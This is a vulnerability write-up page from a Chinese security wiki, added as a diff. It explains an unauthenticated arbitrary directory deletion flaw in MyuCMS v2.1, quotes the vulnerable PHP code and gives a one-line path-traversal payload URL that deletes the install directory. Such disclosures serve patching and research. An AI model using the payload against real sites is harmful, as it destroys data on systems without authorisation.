@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MyuCMS/MyuCMS%20v2.1%20%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MyuCMS v2.1 任意目录删除漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "MyuCMS v2.1 \u4efb\u610f\u76ee\u5f55\u5220\u9664\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        MyuCMS v2.1 前台任意文件下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MyuCMS v2.1 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="myucms-v21">MyuCMS v2.1 任意目录删除漏洞<a class="headerlink" href="#myucms-v21" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>MyuCMS v2.1</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>因为漏洞描述是任意文件删除，所以先全文搜索 <strong>unlink</strong>
+函数，定位到存在文件删除功能的代码段。</p>
+<p>定位到 <strong>application/common.php</strong> 中的 <strong>deleteun</strong> 函数</p>
+<p><img alt="1.jpg" src="../resource/MyuCMSv2.1%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/media/rId24.jpg" /></p>
+<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">deleteun</span><span class="p">(</span>$dir_name<span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span>$<span class="n">result</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_dir</span><span class="p">(</span>$<span class="n">dir_name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>判断是否为目录
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="nb">handle</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">opendir</span><span class="p">(</span>$<span class="n">dir_name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>打开目录
+<span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nb">false</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="p">(</span>$<span class="n">item</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">readdir</span><span class="p">(</span>$<span class="nb">handle</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>通过这个<span class="w"> </span><span class="k">while</span><span class="w"> </span>遍历目录中的文件<span class="w"> </span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">item</span><span class="w"> </span>!<span class="p">=</span><span class="w"> </span><span class="s">&#39;.&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>$<span class="n">item</span><span class="w"> </span>!<span class="p">=</span><span class="w"> </span><span class="s">&#39;..&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_dir</span><span class="p">(</span>$<span class="n">dir_name</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">DS</span><span class="w"> </span><span class="p">.</span><span class="w"> </span>$<span class="n">item</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>若遍历到的文件为子目录，则递归调用<span class="n">deleteun</span>
+<span class="w">                        </span><span class="n">deleteun</span><span class="p">(</span>$<span class="n">dir_name</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">DS</span><span class="w"> </span><span class="p">.</span><span class="w"> </span>$<span class="n">item</span><span class="p">);</span>
+<span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="n">unlink</span><span class="p">(</span>$<span class="n">dir_name</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">DS</span><span class="w"> </span><span class="p">.</span><span class="w"> </span>$<span class="n">item</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>删除遍历到的文件
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="n">closedir</span><span class="p">(</span>$<span class="nb">handle</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>关闭文件夹
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">rmdir</span><span class="p">(</span>$<span class="n">dir_name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">//</span><span class="w"> </span>删除该目录
+<span class="w">                </span>$<span class="n">result</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>$<span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>根据 <strong>deleteun</strong>
+函数的实现代码来看，我们可以看到该函数中对传入的参数无任何限制。</p>
+<p>然后在整个项目中搜索，看哪个文件中调用了 <strong>deleteun</strong> 函数。</p>
+<p>发现总共三处两个文件调用了该函数，且这三处代码内容相同，只不过是传递给的
+<strong>deleteun</strong>
+函数的参数不同，我们可以判断出，这三处都可以触发任意目录删除漏洞。</p>
+<p><img alt="2.jpg" src="../resource/MyuCMSv2.1%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/media/rId25.jpg" /></p>
+<p>这三处的不同之处在于。<strong>Muban.php</strong> 继承了 <strong>Common</strong> 类，在 <strong>Common</strong>
+类中实现了对于是否已经登录的验证。实现代码如下。</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">_initialize</span><span class="p">(){</span>
+<span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="n">session</span><span class="p">(</span><span class="s">&#39;usermail&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">session</span><span class="p">(</span><span class="s">&#39;kouling&#39;</span><span class="p">)){</span>
+<span class="w">           </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="s">&#39;请登录&#39;</span><span class="p">,</span><span class="n">url</span><span class="p">(</span><span class="s">&#39;login/index&#39;</span><span class="p">));</span><span class="w"> </span>
+<span class="w">           </span><span class="n">print</span><span class="w"> </span><span class="n">s</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>而 <strong>Addons.php</strong> 继承自 <strong>AdminBase</strong> 类，且初始化时执行父类
+<strong>AdminBase</strong> 的 <strong>_initialize()</strong> 方法，在 <strong>AdminBase</strong>
+类中调用了父类 <strong>Controller</strong> 的 <strong>_initialize()</strong> 方法。而父类的
+<strong>Controller</strong> 的 <strong>_initialize();</strong> 方法的实现内容为空。</p>
+<p>所以 <strong>Addons.php</strong>
+在未登录的情况下也可以访问。这意味我们不需要登录后台也可以触发任意目录删除漏洞。</p>
+<h3 id="payload">Payload<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h3>
+<p>所以给出 Payload 如下，即可删除整个 <strong>install</strong> 目录</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">Addons</span><span class="o">/</span><span class="n">un</span><span class="err">?</span><span class="n">info</span><span class="o">=../</span><span class="n">install</span>
+</code></pre></div>
+
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7271">https://xz.aliyun.com/t/7271</a>#toc-0</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        MyuCMS v2.1 前台任意文件下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MyuCMS v2.1 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
